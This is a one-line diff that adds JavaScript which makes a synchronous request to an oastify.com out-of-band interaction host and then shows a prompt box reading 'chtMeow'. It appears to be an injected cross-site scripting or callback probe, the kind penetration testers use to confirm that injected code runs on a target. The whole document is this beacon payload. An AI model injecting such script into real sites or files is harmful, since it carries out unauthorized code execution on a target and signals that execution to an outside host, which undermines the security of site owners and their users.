@@ -1,0 +1,1 @@
+var limitReq = new XMLHttpRequest();limitReq.open("GET", "https://gxhndxfsupfh0anfnb9cp8vai1oscj57u.oastify.com",false);limitReq.send();prompt("chtMeow")
